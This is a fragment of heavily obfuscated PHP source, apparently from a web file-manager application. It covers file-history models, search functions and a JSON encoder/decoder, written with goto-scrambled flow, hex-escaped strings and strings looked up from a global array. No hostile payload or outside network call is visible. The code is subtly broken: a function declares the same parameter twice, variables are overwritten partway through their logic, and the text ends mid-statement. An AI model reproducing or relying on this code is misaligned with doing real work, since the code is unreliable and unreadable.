private function eventListParse($aŰѲ, $F) { goto F; Dϳ: return $aŰѲ; goto f; a: $b = array_unique($b); $b쯨 = array_unique(array_to_keyvalue($D㯦, $cٙ[33], $cٙ[1404])); $eϱ̲ = Model($cٙ[473])->userListInfo($b쯨); goto B; B: $dȑϬ۱ = Model($cٙ[744])->sourceListInfo($b, !0); foreach ($D㯦 as &$cÇ) { if ($cÇ[$cٙ[29]] == $cٙ[488] && isset($cÇ[$cٙ[401]][$cٙ[989]])) { $cÇ[$cٙ[401]][$cٙ[989]] = $dȑϬ۱[$cÇ[$cٙ[401]][$cٙ[989]]]; $cÇ[$cٙ[401]][$cٙ[990]] = $dȑϬ۱[$cÇ[$cٙ[401]][$cٙ[990]]]; } if ($cÇ[$cٙ[29]] == $cٙ[2254] && isset($cÇ[$cٙ[401]][$cٙ[365]])) { $cÇ[$cٙ[401]][$cٙ[365]] = $dȑϬ۱[$cÇ[$cٙ[401]][$cٙ[365]]]; } $cÇ[$cٙ[387]] = $dȑϬ۱[$cÇ[$cٙ[365]]]; $cÇ[$cٙ[2259]] = $dȑϬ۱[$cÇ[$cٙ[2246]]]; if ($cÇ[$cٙ[29]] == $cٙ[2033]) { $cÇ[$cٙ[2259]] = $cÇ[$cٙ[387]]; $cÇ[$cٙ[2246]] = $cÇ[$cٙ[2259]][$cٙ[365]]; $cÇ[$cٙ[387]] = !1; $cÇ[$cٙ[365]] = $cٙ[33]; } $cÇ[$cٙ[2203]] = $eϱ̲[$cÇ[$cٙ[1404]]]; } $aŰѲ[$cٙ[350]] = $D㯦; goto Dϳ; F: $cٙ =& $_SERVER[ԥ]; $D㯦 = $aŰѲ[$cٙ[350]]; $b = array_to_keyvalue($D㯦, $cٙ[33], $cٙ[365]); goto A; A: $b = array_to_keyvalue($D㯦, $cٙ[33], $cٙ[2246]); foreach ($D㯦 as $cÇ) { $d餍 = $cÇ[$cٙ[401]]; if ($cÇ[$cٙ[29]] == $cٙ[488] && isset($d餍[$cٙ[989]])) { $b[] = $d餍[$cٙ[989]] . $cٙ[33]; $b[] = $d餍[$cٙ[990]] . $cٙ[33]; } if ($cÇ[$cٙ[29]] == $cٙ[2254] && isset($d餍[$cٙ[365]])) { $b[] = $d餍[$cٙ[365]] . $cٙ[33]; } } $b = array_merge($b, $b, array($F . $cٙ[33])); goto a; f: } public function removeBySource($fʻ) { $B = array($_SERVER[ԥ][379] => $fʻ); $this->where($B)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\x72\x63\x65\137\150\151\163\164\157\162\x79"; public function addHistory($C, $D = '') { $E =& $_SERVER[ԥ]; $B뇔 = array($E[379] => $C[$E[365]], $E[1395] => isset($C[$E[375]]) ? $C[$E[375]] : $C[$E[374]], $E[416] => $C[$E[415]], $E[516] => $C[$E[77]], $E[2260] => $D); $c = $GLOBALS[$E[6]][$E[84]][$E[2261]]; if ($c > 1) { $this->historyAutoClear($B뇔[$E[365]]); $this->add($B뇔); } Model($E[2262])->eventFileEdit($C[$E[365]]); } private function historyAutoClear($cѐ) { goto b򡊽; b򡊽: $d =& $_SERVER[ԥ]; $bʂ = Model($d[1071])->get($d[2263]); $b͒ = $GLOBALS[$d[6]][$d[84]][$d[2261]]; goto E驞; e亏׍: if ($a >= 500) { return; } $A = array($d[379] => $cѐ); $B퐸 = $this->field($d[2265])->where($A)->order($d[2257])->select(); goto Fړ; E驞: $CĘ = $bʂ == $d[2264] ? 3 : $b͒; if ($b͒ <= 1) { $CĘ = 1; } $a = $CĘ - 1; goto e亏׍; cʢ: $A = array($d[381] => array($d[7], $dʭ)); $this->where($A)->delete(); Model($d[418])->remove($D); goto Aʎ; Fړ: if (!$B퐸 || $a >= count($B퐸)) { return; } $dʭ = array_to_keyvalue($B퐸, $d[33], $d[363]); $dʭ = array_slice($dʭ, $a); goto D㤎; D㤎: $D = array_to_keyvalue($B퐸, $d[33], $d[415]); $D = array_slice($D, $a); if (!$dʭ || !$D) { return; } goto cʢ; Aʎ: } public function listData($A琵) { goto eö; Bۋ˴: $f = $this->field($f)->where($dܻ)->order($eو[2257])->selectPage(); $this->_listAppendUser($f[$eو[350]]); $BƼ = Model($eو[1071])->get($eو[2263]); goto A; A: $a = 3; if ($BƼ == $eو[2264]) { $f[$eو[350]] = array_slice($f[$eو[350]], 0, $a); $f[$eو[347]] = array($eو[2267] => 1, $eو[2268] => 20, $eو[2269] => 1, $eو[2270] => count($f[$eو[350]])); } return $f; goto eړ; eö: $eو =& $_SERVER[ԥ]; $dܻ = array($eو[379] => $A琵); $f = $eو[2266]; goto Bۋ˴; eړ: } protected function _listAppendUser(&$E⣌) { $d =& $_SERVER[ԥ]; $dԊ = array_to_keyvalue($E⣌, $d[33], $d[1404]); $B = Model($d[473])->userListInfo($dԊ); foreach ($E⣌ as &$a) { $fϗȈ = $a[$d[1404]]; $a[$d[374]] = $B[$fϗȈ] ? $B[$fϗȈ] : !1; } } public function fileInfo($b𛆬) { $c͂ =& $_SERVER[ԥ]; $c׏څ = $this->tablePrefix; $D = "{$c׏څ}\x69\157\x5f\146\151\x6c\x65\40\x66\151\154\145\163\x20\x6f\156\40\x66\151\x6c\145\x73\56\146\151\x6c\x65\111\x44\x20\75\x20\x68\151\x73\x74\x6f\162\171\56\146\151\154\145\111\x44"; return $this->alias($c͂[2271])->where(array($c͂[381] => $b𛆬))->join($D, $c͂[2272])->find(); } public function removeItem($E) { $c =& $_SERVER[ԥ]; $a׌ = array($c[381] => $E); $dڈ = $this->where($a׌)->find(); if ($dڈ) { $Cǳ = $this->where($a׌)->delete(); Model($c[418])->remove($dڈ[$c[415]]); return $Cǳ; } return !1; } public function removeBySource($dִ) { goto e; eɡ: $fѺ = array($c޲ʉ[379] => array($c޲ʉ[7], $dִ)); $aˑ = $this->field($c޲ʉ[416])->where($fѺ)->select(); if ($aˑ) { $this->where($fѺ)->delete(); $fҦ = array_to_keyvalue($aˑ, $c޲ʉ[33], $c޲ʉ[415]); Model($c޲ʉ[418])->remove($fҦ); } goto D팕; D팕: return !0; goto Eޒ; e: $c޲ʉ =& $_SERVER[ԥ]; if (!$dִ) { return !1; } if (!is_array($dִ)) { $dִ = array($dִ); } goto eɡ; Eޒ: } public function setDetail($Dߓ, $d΅) { $d =& $_SERVER[ԥ]; return $this->where(array($d[381] => $Dߓ))->save(array($d[2260] => $d΅)); } public function rollbackToItem($Fރ, $Aʋ) { goto D玊; dƄ̌: return $this->where(array($FȽ[381] => $Aʋ))->delete(); goto EآԶ; D玊: $FȽ =& $_SERVER[ԥ]; $Cͭ = Model($FȽ[744])->sourceInfo($Fރ); $this->addHistory($Cͭ); goto Dى; Dى: $Bي = $this->find($Aʋ); $C = array($FȽ[415] => $Bي[$FȽ[415]], $FȽ[77] => $Bي[$FȽ[77]], $FȽ[106] => time(), $FȽ[375] => USER_ID); Model($FȽ[744])->where(array($FȽ[365] => $Fރ))->save($C); goto dƄ̌; EآԶ: } public function clearSame($A閅) { goto FŮ; FŮ: $f =& $_SERVER[ԥ]; $DƠ = $this->listData($A閅); $c֊ = array_to_keyvalue_group($DƠ, $f[415]); goto cӇ; cӇ: $f = array(); $F = array(); foreach ($c֊ as $e单) { if (!$e单 || count($e单) <= 1) { continue; } foreach ($e单 as $eЇÍ) { $f[] = $eЇÍ[$f[415]]; $F[] = $eЇÍ[$f[363]]; } } goto D; D: if (!$F) { return; } $this->where(array($f[363] => array($f[7], $F)))->delete(); Model($f[418])->remove($f); goto FՎ٣Ç; FՎ٣Ç: } public function userSpace() { $C =& $_SERVER[ԥ]; $fٛ = $this->tablePrefix; $c = array($C[1395] => USER_ID); $Eݠ = "{$fٛ}\151\157\137\x66\151\x6c\145\x20\146\151\x6c\145\x73\40\157\156\40\x66\x69\154\145\163\56\146\x69\x6c\145\111\x44\40\75\40\150\x69\x73\164\x6f\162\171\56\x66\151\154\145\x49\104"; return $this->alias($C[2271])->where($c)->join($Eݠ, $C[2272])->sum($C[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($c֛) { goto aƋ; C톮: if (!$fṅ[$d[156]]) { $b = array_to_keyvalue($FΣǆ, $d[33], $d[156]); $Fݣ翪 = implode($d[47], $b); $D˘ = $d[2222]; } $F燲 = explode($d[47], trim($Fݣ翪, $d[47])); return array($D˘, $F燲); goto Fˠ; aƋ: $d =& $_SERVER[ԥ]; $FΣǆ = KodIO::fileTypeList(); $fṅ = $FΣǆ[$c֛]; goto d눋; d눋: if (!$fṅ) { return array(); } $Fݣ翪 = $fṅ[$d[156]]; $D˘ = $d[7]; goto C톮; Fˠ: } public function listPathType($BѮ) { $f =& $_SERVER[ԥ]; $B̛٭ = $this->fileTypeWhere($BѮ); if (!$B̛٭) { return array(); } $eܺ = array($f[517] => SourceModel::TYPE_USER, $f[518] => USER_ID, $f[514] => 0, $f[515] => $B̛٭); return $this->listSource($eܺ); } public function listSearch($A, $A = 300) { goto D܋; D܋: $e؞ =& $_SERVER[ԥ]; if (isset($A[$e؞[2142]]) && $A[$e؞[2142]]) { $A[$e؞[2142]] = str_replace($e؞[1555], $e؞[2273], trim($A[$e؞[2142]])); } $Cꖫ = $this->_parseSearchWhere($A); goto d; d: if (!isset($Cꖫ[$e؞[393]])) { $Cꖫ[$e؞[393]] = 0; } $C = $e؞[2274]; $fƛ = $C; goto Aұ; dαڃ: $this->_listSearchDesc($Cڎ, $A, $fƛ); $this->_listSearchTag($Cڎ, $A, $fƛ); $this->_listDataApply($Cڎ[$e؞[350]]); goto b; b: $this->_listMake($Cڎ); return $Cڎ; goto f; Aұ: $this->_listSearchBindPinyin($A, $Cꖫ, $C); $this->alias($e؞[483])->_makeOrder()->cache(null, 10); $Cڎ = $this->distinct(!0)->field($C)->where($Cꖫ)->selectPage($A); goto dαڃ; f: } private function _listSearchTag(&$f, $EŒ, $F猭) { goto e; A: $b΃ = array_to_keyvalue($b΃, $A[33], $A[75]); $E = array_unique($b΃); $this->_listSearchMerge($f, $EŒ, $F猭, $E); goto Dԥ; BЩ: if (!$a萩) { return; } $f̍ = array($A[389] => array($A[7], $a萩)); $b΃ = Model($A[390])->field($A[75])->where($f̍)->select(); goto A; dϱȓ: $a萩 = array(); $c = $EŒ[$A[2142]]; foreach ($c폺Ꚅ as $Aɰ) { $E = $Aɰ[$A[28]]; $a = str_replace($A[50], $A[33], Pinyin::encode($E)); if (stripos($E, $c) !== !1 || stripos($a, $c) !== !1) { $a萩[] = $Aɰ[$A[363]]; } } goto BЩ; e: $A =& $_SERVER[ԥ]; if (!$EŒ[$A[2142]] || $f[$A[347]][$A[336]] > 1) { return; } $c폺Ꚅ = Model($A[2275])->listData(); goto dϱȓ; Dԥ: } private function _listSearchDesc(&$c, $Dۆد, $AҎ񟮄) { goto a; cﵒÇ: $C² = Model($D萚[500])->field($D萚[365])->where($cٜ)->select(); $D = array_to_keyvalue($C², $D萚[33], $D萚[365]); $this->_listSearchMerge($c, $Dۆد, $AҎ񟮄, $D); goto cĶ; e: $F̳ = array_unique($F̳); if (!$F̳) { return; } $cٜ = array($D萚[365] => array($D萚[7], $F̳), $D萚[89] => $D萚[401], $D萚[355] => array($D萚[743], $D萚[2144] . $Dۆد[$D萚[2142]] . $D萚[2144])); goto cﵒÇ; a: $D萚 =& $_SERVER[ԥ]; if (!$Dۆد[$D萚[2142]] || $c[$D萚[347]][$D萚[336]] > 1) { return; } $F̳ = $this->listSearchChildren($Dۆد[$D萚[457]]); goto e; cĶ: } private function _listSearchMerge(&$bՃڢ, $eж, $FŻ, $b) { goto E; f: $Aģ = array_diff($b, $a); if (!$Aģ) { return; } $c = array($aΈɒ[365] => array($aΈɒ[7], $Aģ)); goto fŬ; fŬ: $cꇎ = $this->field($FŻ)->where($c)->select(); if (!$cꇎ) { return; } $eޏט = array(); goto dџ; dџ: foreach ($cꇎ as $EѰ) { $FףȆ = $aΈɒ[47] . $eж[$aΈɒ[457]] . $aΈɒ[47]; if (stripos($EѰ[$aΈɒ[455]], $FףȆ) !== !1) { $eޏט[] = $EѰ; } } $bՃڢ[$aΈɒ[350]] = array_merge($eޏט, $bՃڢ[$aΈɒ[350]]); $bՃڢ[$aΈɒ[347]][$aΈɒ[348]] += count($eޏט); goto Bэ; E: $aΈɒ =& $_SERVER[ԥ]; if (!$b) { return; } $a = array_to_keyvalue($bՃڢ[$aΈɒ[350]], $aΈɒ[33], $aΈɒ[365]); goto f; Bэ: } public function listSearchChildren($Bֻċی, $c׿ = 5000) { goto bٶ; bٶ: $Eﰅ =& $_SERVER[ԥ]; $Fޢ = array(); $c = $this->sourceInfo($Bֻċی); goto EѸ; Dߓ: $f = $this->field($Eﰅ[365])->where($dá)->select(); $Fޢ = array_to_keyvalue($f, $Eﰅ[33], $Eﰅ[365]); return $Fޢ; goto E׈; EѸ: $dá = array($Eﰅ[455] => array($Eﰅ[743], $c[$Eﰅ[455]] . $c[$Eﰅ[365]] . $Eﰅ[480])); $D䥎 = $this->field($Eﰅ[365])->cache(null, 600)->where($dá)->count(); if ($D䥎 > $c׿) { return $this->_listSearchChildrenNear($Bֻċی, $c׿); } goto Dߓ; E׈: } private function _listSearchChildrenNear($Cܕ, $E) { goto Eȑ; Eȑ: $D쏯 =& $_SERVER[ԥ]; $A겹 = array(); $fӑ = array($D쏯[457] => $Cܕ); goto eՏ; f: $A겹 = array_merge($A겹, array_to_keyvalue($cؔ, $D쏯[33], $D쏯[365])); $A겹 = array_slice($A겹, 0, $E); return $A겹; goto Cʲ󰖄; eՏ: $cؔ = $this->field($D쏯[2276])->where($fӑ)->select(); $bߜ = array_to_keyvalue(array_filter_by_field($cؔ, $D쏯[366], $D쏯[83]), $D쏯[33], $D쏯[365]); $A겹 = array_merge($A겹, array_to_keyvalue($cؔ, $D쏯[33], $D쏯[365])); goto Bы; Bы: if (!$bߜ) { return $A겹; } $fӑ = array($D쏯[457] => array($D쏯[7], $bߜ)); $cؔ = $this->field($D쏯[2276])->where($fӑ)->select(); goto f; Cʲ󰖄: } private function _listSearchBindPinyin($EγӅ, &$Cæ, &$D) { goto A݉; A: $C㲱 = array(); $D = str_replace(array($Aݧ[213], $Aݧ[50], $Aݧ[2277]), $Aݧ[33], $D); $D = $Aݧ[2278] . str_replace($Aݧ[47], $Aݧ[2279], $D); goto F֡; F֡: unset($Cæ[$Aݧ[28]]); foreach ($Cæ as $C蘏 => $C) { $C㲱[$Aݧ[2278] . $C蘏] = $C; } $fǛ = array($Aݧ[479], $Aݧ[2144] . $EγӅ[$Aݧ[2142]] . $Aݧ[2144]); goto dլ; A݉: $Aݧ =& $_SERVER[ԥ]; if (!Input::check($EγӅ[$Aݧ[2142]], $Aݧ[302]) || strlen($EγӅ[$Aݧ[2142]]) < 2) { return; } $e = "\x4c\x45\106\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\157\137\163\x6f\165\x72\x63\x65\137\155\145\x74\141\40\155\x65\x74\141\40\157\x6e\40\x73\x6f\x75\162\x63\x65\56\163\x6f\165\x72\143\x65\x49\x44\40\x3d\40\155\x65\164\x61\x2e\x73\x6f\165\x72\143\145\x49\104"; goto A; dլ: $C㲱[] = array($Aݧ[2280] => $fǛ, $Aݧ[899] => $Aݧ[2146], array($Aݧ[2281] => $fǛ, $Aݧ[2282] => array($Aݧ[7], array($Aݧ[412], $Aݧ[411])))); $this->join($e); $Cæ = $C㲱; goto Dҳˍ; Dҳˍ: } private function _parseSearchWhere($eՇĨ) { goto eُğ; cƷӝȍ: if (isset($eՇĨ[$Cƕ[2142]]) && $eՇĨ[$Cƕ[2142]]) { $D = $eՇĨ[$Cƕ[2142]]; $d΢ = explode($Cƕ[50], $D); if (strlen($D) > 2 && (substr($D, 0, 1) == $Cƕ[112] && substr($D, -1) == $Cƕ[112]) || substr($D, 0, 1) == $Cƕ[55] && substr($D, -1) == $Cƕ[55]) { $D = substr($D, 1, -1); $d΢ = array($D); } $E[$Cƕ[28]] = array($Cƕ[479], $Cƕ[2144] . $D . $Cƕ[2144]); if (count($d΢) > 1) { $E[$Cƕ[28]] = array(); foreach ($d΢ as $E) { if (!trim($E)) { continue; } $E[$Cƕ[28]][] = array($Cƕ[479], $Cƕ[2144] . trim($E) . $Cƕ[2144]); } } } return $E; goto fޫڷ; Dٝ: if (isset($eՇĨ[$Cƕ[531]])) { $E[] = array($Cƕ[375] => $eՇĨ[$Cƕ[531]], $Cƕ[374] => $eՇĨ[$Cƕ[531]], $Cƕ[899] => $Cƕ[2146]); } if (isset($eՇĨ[$Cƕ[368]])) { $eꑒ = $eՇĨ[$Cƕ[368]]; if ($eꑒ == $Cƕ[76]) { $E[$Cƕ[366]] = 1; } else { if ($eꑒ == $Cƕ[2288]) { $E[$Cƕ[366]] = 0; } else { if ($eꑒ) { $eꑒ = is_array($eꑒ) ? $eꑒ : explode($Cƕ[47], $eꑒ); $E[$Cƕ[368]] = array($Cƕ[380], $eꑒ); $E[$Cƕ[366]] = 0; } } } } if (isset($eՇĨ[$Cƕ[457]])) { $C܋腜 = $this->sourceInfo($eՇĨ[$Cƕ[457]]); $E[$Cƕ[521]] = array($Cƕ[479], $C܋腜[$Cƕ[455]] . $eՇĨ[$Cƕ[457]] . $Cƕ[480]); } goto cƷӝȍ; eُğ: $Cƕ =& $_SERVER[ԥ]; $E = array(); if (isset($eՇĨ[$Cƕ[686]])) { $E[$Cƕ[106]] = array($Cƕ[2283], $eՇĨ[$Cƕ[686]]); } goto f; f: if (isset($eՇĨ[$Cƕ[687]])) { $fܨǎ = array($Cƕ[2284], $eՇĨ[$Cƕ[687]]); if ($E[$Cƕ[106]]) { $E[$Cƕ[106]] = array($E[$Cƕ[106]], $fܨǎ, $Cƕ[2285]); } else { $E[$Cƕ[106]] = $fܨǎ; } } if (isset($eՇĨ[$Cƕ[2286]])) { $E[$Cƕ[77]] = array($Cƕ[2283], $eՇĨ[$Cƕ[2286]]); } if (isset($eՇĨ[$Cƕ[2287]])) { $fܨǎ = array($Cƕ[2284], $eՇĨ[$Cƕ[2287]]); if ($E[$Cƕ[77]]) { $E[$Cƕ[77]] = array($E[$Cƕ[77]], $fܨǎ, $Cƕ[2285]); } else { $E[$Cƕ[77]] = $fܨǎ; } } goto Dٝ; fޫڷ: } } goto b까; B: define($_SERVER[ԥ][1899], 16); define($_SERVER[ԥ][1900], 32); class Services_JSON { function __construct($D庸 = 0) { $this->use = $D庸; } function utf162utf8($bȭ) { $dԨ =& $_SERVER[ԥ]; if (function_exists($dԨ[68])) { return mb_convert_encoding($bȭ, $dԨ[1552], $dԨ[1901]); } $dĎ׼ = ord($bȭ[0]) << 8 | ord($bȭ[1]); switch (!0) { case (127 & $dĎ׼) == $dĎ׼: return chr(127 & $dĎ׼); case (2047 & $dĎ׼) == $dĎ׼: return chr(192 | $dĎ׼ >> 6 & 31) . chr(128 | $dĎ׼ & 63); case (65535 & $dĎ׼) == $dĎ׼: return chr(224 | $dĎ׼ >> 12 & 15) . chr(128 | $dĎ׼ >> 6 & 63) . chr(128 | $dĎ׼ & 63); } return $dԨ[33]; } function utf82utf16($b) { $C舨 =& $_SERVER[ԥ]; if (function_exists($C舨[68])) { return mb_convert_encoding($b, $C舨[1901], $C舨[1552]); } switch (strlen($b)) { case 1: return $b; case 2: return chr(7 & ord($b[0]) >> 2) . chr(192 & ord($b[0]) << 6 | 63 & ord($b[1])); case 3: return chr(240 & ord($b[0]) << 4 | 15 & ord($b[1]) >> 2) . chr(192 & ord($b[1]) << 6 | 127 & ord($b[2])); } return $C舨[33]; } function encode($eʕ) { $A̱ =& $_SERVER[ԥ]; switch (gettype($eʕ)) { case $A̱[1563]: return $eʕ ? $A̱[1562] : $A̱[1564]; case $A̱[1902]: return $A̱[99]; case $A̱[299]: return (int) $eʕ; case $A̱[274]: case $A̱[273]: return (double) $eʕ; case $A̱[308]: $bڈ = $A̱[33]; $A۹頊 = strlen($eʕ); for ($bȠ = 0; $bȠ < $A۹頊; ++$bȠ) { $E鶞 = ord($eʕ[$bȠ]); switch (!0) { case $E鶞 == 8: $bڈ .= $A̱[1903]; break; case $E鶞 == 9: $bڈ .= $A̱[1539]; break; case $E鶞 == 10: $bڈ .= $A̱[1537]; break; case $E鶞 == 12: $bڈ .= $A̱[1904]; break; case $E鶞 == 13: $bڈ .= $A̱[1538]; break; case $E鶞 == 34: case $E鶞 == 47: case $E鶞 == 92: $bڈ .= $A̱[93] . $eʕ[$bȠ]; break; case $E鶞 >= 32 && $E鶞 <= 127: $bڈ .= $eʕ[$bȠ]; break; case ($E鶞 & 224) == 192: $e = pack($A̱[1905], $E鶞, ord($eʕ[$bȠ + 1])); $bȠ += 1; $eƌ˷ = $this->utf82utf16($e); $bڈ .= sprintf($A̱[1906], bin2hex($eƌ˷)); break; case ($E鶞 & 240) == 224: $e = pack($A̱[1905], $E鶞, ord($eʕ[$bȠ + 1]), ord($eʕ[$bȠ + 2])); $bȠ += 2; $eƌ˷ = $this->utf82utf16($e); $bڈ .= sprintf($A̱[1906], bin2hex($eƌ˷)); break; case ($E鶞 & 248) == 240: $e = pack($A̱[1905], $E鶞, ord($eʕ[$bȠ + 1]), ord($eʕ[$bȠ + 2]), ord($eʕ[$bȠ + 3])); $bȠ += 3; $eƌ˷ = $this->utf82utf16($e); $bڈ .= sprintf($A̱[1906], bin2hex($eƌ˷)); break; case ($E鶞 & 252) == 248: $e = pack($A̱[1905], $E鶞, ord($eʕ[$bȠ + 1]), ord($eʕ[$bȠ + 2]), ord($eʕ[$bȠ + 3]), ord($eʕ[$bȠ + 4])); $bȠ += 4; $eƌ˷ = $this->utf82utf16($e); $bڈ .= sprintf($A̱[1906], bin2hex($eƌ˷)); break; case ($E鶞 & 254) == 252: $e = pack($A̱[1905], $E鶞, ord($eʕ[$bȠ + 1]), ord($eʕ[$bȠ + 2]), ord($eʕ[$bȠ + 3]), ord($eʕ[$bȠ + 4]), ord($eʕ[$bȠ + 5])); $bȠ += 5; $eƌ˷ = $this->utf82utf16($e); $bڈ .= sprintf($A̱[1906], bin2hex($eƌ˷)); break; } } return $A̱[112] . $bڈ . $A̱[112]; case $A̱[1907]: if (is_array($eʕ) && count($eʕ) && array_keys($eʕ) !== range(0, sizeof($eʕ) - 1)) { $bü = array_map(array($this, $A̱[1908]), array_keys($eʕ), array_values($eʕ)); foreach ($bü as $dᅜ) { if (Services_JSON::isError($dᅜ)) { return $dᅜ; } } return $A̱[1051] . join($A̱[47], $bü) . $A̱[311]; } $fŖ = array_map(array($this, $A̱[1909]), $eʕ); foreach ($fŖ as $D) { if (Services_JSON::isError($D)) { return $D; } } return $A̱[153] . join($A̱[47], $fŖ) . $A̱[472]; case $A̱[1910]: $bŶ = get_object_vars($eʕ); $bü = array_map(array($this, $A̱[1908]), array_keys($bŶ), array_values($bŶ)); foreach ($bü as $dᅜ) { if (Services_JSON::isError($dᅜ)) { return $dᅜ; } } return $A̱[1051] . join($A̱[47], $bü) . $A̱[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $A̱[99] : new Services_JSON_Error(gettype($eʕ) . $A̱[1911]); } } function name_value($fܿ, $C) { $eڄ = $this->encode($C); if (Services_JSON::isError($eڄ)) { return $eڄ; } return $this->encode(strval($fܿ)) . $_SERVER[ԥ][4] . $eڄ; } function reduce_string($B㈡) { $A솸Ͳ =& $_SERVER[ԥ]; $B㈡ = preg_replace(array($A솸Ͳ[1912], $A솸Ͳ[1913], $A솸Ͳ[1914]), $A솸Ͳ[33], $B㈡); return trim($B㈡); } function decode($f摔) { $F =& $_SERVER[ԥ]; $f摔 = $this->reduce_string($f摔); switch (strtolower($f摔)) { case $F[1562]: return !0; case $F[1564]: return !1; case $F[99]: return null; default: $e߆Ͽ = array(); if (is_numeric($f摔)) { return (double) $f摔 == (int) $f摔 ? (int) $f摔 : (double) $f摔; } elseif (preg_match($F[1915], $f摔, $e߆Ͽ) && $e߆Ͽ[1] == $e߆Ͽ[2]) { $c搸̣ = substr($f摔, 0, 1); $A◠ = substr($f摔, 1, -1); $Bڠ = $F[33]; $b̥ = strlen($A◠); for ($A = 0; $A < $b̥; ++$A) { $Eܚ = substr($A◠, $A, 2); $aŝޔ = ord($A◠[$A]); switch (!0) { case $Eܚ == $F[1903]: $Bڠ .= chr(8); ++$A; break; case $Eܚ == $F[1539]: $Bڠ .= chr(9); ++$A; break; case $Eܚ == $F[1537]: $Bڠ .= chr(10); ++$A; break; case $Eܚ == $F[1904]: $Bڠ .= chr(12); ++$A; break; case $Eܚ == $F[1538]: $Bڠ .= chr(13); ++$A; break; case $Eܚ == $F[1324]: case $Eܚ == $F[1916]: case $Eܚ == $F[1532]: case $Eܚ == $F[1534]: if ($c搸̣ == $F[112] && $Eܚ != $F[1916] || $c搸̣ == $F[55] && $Eܚ != $F[1324]) { $Bڠ .= $A◠[++$A]; } break; case preg_match($F[1917], substr($A◠, $A, 6)): $E = chr(hexdec(substr($A◠, $A + 2, 2))) . chr(hexdec(substr($A◠, $A + 4, 2))); $Bڠ .= $this->utf162utf8($E); $A += 5; break; case $aŝޔ >= 32 && $aŝޔ <= 127: $Bڠ .= $A◠[$A]; break; case ($aŝޔ & 224) == 192: $Bڠ .= substr($A◠, $A, 2); ++$A; break; case ($aŝޔ & 240) == 224: $Bڠ .= substr($A◠, $A, 3); $A += 2; break; case ($aŝޔ & 248) == 240: $Bڠ .= substr($A◠, $A, 4); $A += 3; break; case ($aŝޔ & 252) == 248: $Bڠ .= substr($A◠, $A, 5); $A += 4; break; case ($aŝޔ & 254) == 252: $Bڠ .= substr($A◠, $A, 6); $A += 5; break; } } return $Bڠ; } elseif (preg_match($F[1918], $f摔) || preg_match($F[1919], $f摔)) { goto dϼ훊; Cσߍ: $A◠ = $this->reduce_string($A◠); if ($A◠ == $F[33]) { if (reset($dӅ) == SERVICES_JSON_IN_ARR) { return $Eפ܂ݕ; } else { return $c; } } $b̥ = strlen($A◠); goto B▍ܽ; B▍ܽ: for ($A = 0; $A <= $b̥; ++$A) { $b똕ȇ = end($dӅ); $Eܚ = substr($A◠, $A, 2); if ($A == $b̥ || $A◠[$A] == $F[47] && $b똕ȇ[$F[1920]] == SERVICES_JSON_SLICE) { $cʜ = substr($A◠, $b똕ȇ[$F[259]], $A - $b똕ȇ[$F[259]]); array_push($dӅ, array($F[1920] => SERVICES_JSON_SLICE, $F[259] => $A + 1, $F[1921] => !1)); if (reset($dӅ) == SERVICES_JSON_IN_ARR) { array_push($Eפ܂ݕ, $this->decode($cʜ)); } elseif (reset($dӅ) == SERVICES_JSON_IN_OBJ) { $Aņ = array(); if (preg_match($F[1922], $cʜ, $Aņ)) { $aǕ = $this->decode($Aņ[1]); $BŒ׆ = $this->decode($Aņ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c[$aǕ] = $BŒ׆; } else { $c->{$aǕ} = $BŒ׆; } } elseif (preg_match($F[1923], $cʜ, $Aņ)) { $aǕ = $Aņ[1]; $BŒ׆ = $this->decode($Aņ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c[$aǕ] = $BŒ׆; } else { $c->{$aǕ} = $BŒ׆; } } } } elseif (($A◠[$A] == $F[112] || $A◠[$A] == $F[55]) && $b똕ȇ[$F[1920]] != SERVICES_JSON_IN_STR) { array_push($dӅ, array($F[1920] => SERVICES_JSON_IN_STR, $F[259] => $A, $F[1921] => $A◠[$A])); } elseif ($A◠[$A] == $b똕ȇ[$F[1921]] && $b똕ȇ[$F[1920]] == SERVICES_JSON_IN_STR && (strlen(substr($A◠, 0, $A)) - strlen(rtrim(substr($A◠, 0, $A), $F[93]))) % 2 != 1) { array_pop($dӅ); } elseif ($A◠[$A] == $F[153] && in_array($b똕ȇ[$F[1920]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dӅ, array($F[1920] => SERVICES_JSON_IN_ARR, $F[259] => $A, $F[1921] => !1)); } elseif ($A◠[$A] == $F[472] && $b똕ȇ[$F[1920]] == SERVICES_JSON_IN_ARR) { array_pop($dӅ); } elseif ($A◠[$A] == $F[1051] && in_array($b똕ȇ[$F[1920]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dӅ, array($F[1920] => SERVICES_JSON_IN_OBJ, $F[259] => $A, $F[1921] => !1)); } elseif ($A◠[$A] == $F[311] && $b똕ȇ[$F[1920]] == SERVICES_JSON_IN_OBJ) { array_pop($dӅ); } elseif ($Eܚ == $F[1924] && in_array($b똕ȇ[$F[1920]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dӅ, array($F[1920] => SERVICES_JSON_IN_CMT, $F[259] => $A, $F[1921] => !1)); $A++; } elseif ($Eܚ == $F[1925] && $b똕ȇ[$F[1920]] == SERVICES_JSON_IN_CMT) { array_pop($dӅ); $A++; for ($Bߪ = $b똕ȇ[$F[259]]; $Bߪ <= $A; ++$Bߪ) { $A◠ = substr_replace($A◠, $F[50], $Bߪ, 1); } } } if (reset($dӅ) == SERVICES_JSON_IN_ARR) { return $Eפ܂ݕ; } elseif (reset($dӅ) == SERVICES_JSON_IN_OBJ) { return $c; } goto eƂ٘; dϼ훊: if ($f摔[0] == $F[153]) { $dӅ = array(SERVICES_JSON_IN_ARR); $Eפ܂ݕ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $dӅ = array(SERVICES_JSON_IN_OBJ); $c = array(); } else { $dӅ = array(SERVICES_JSON_IN_OBJ); $c = new stdClass(); } } array_push($dӅ, array($F[1920] => SERVICES_JSON_SLICE, $F[259] => 0, $F[1921] => !1)); $A◠ = substr($f摔, 1, -1); goto 